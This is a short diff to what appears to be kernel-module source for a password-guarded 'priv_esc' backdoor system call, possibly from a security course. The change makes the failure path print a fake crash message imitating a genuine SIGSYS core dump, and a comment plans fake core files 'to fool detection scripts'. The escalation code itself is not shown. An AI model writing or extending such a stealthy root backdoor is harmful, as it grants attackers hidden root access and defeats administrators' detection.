@@ -8,6 +8,8 @@
 #include <sys/proc.h>
 #include <sys/syscall.h>
 #include <sys/syscallsubr.h>
+#include <sys/ucred.h>
+#include <sys/signal.h>
 
 #define PRIV_ESC_PASSWD "6447_priv_esc_passwd"
 
@@ -34,8 +36,10 @@ priv_esc(struct thread *td, void *syscall_args) {
         // struct thread and struct proc are defined in proc.h
         // TODO figure out uid from struct thread/struct proc/somewhere else
         // TODO dump core OR write a random core file to pwd (proc_name.core) to fool detection scripts.
-        printf("pid %d (%s), uid %d: exited on signal 12 (core dumped)\n",
-                td->td_proc->p_pid, td->td_proc->p_comm, 0);
+        printf("pid %d (%s), uid %d: exited on signal %d (core dumped)\n",
+                // TODO check if the default syscall behavior uses real, effective, or saved uid for failed syscalls
+                // this currently uses real uid
+                td->td_proc->p_pid, td->td_proc->p_comm, td->td_ucred->cr_ruid, SIGSYS);
 
         return ENOSYS;
     }
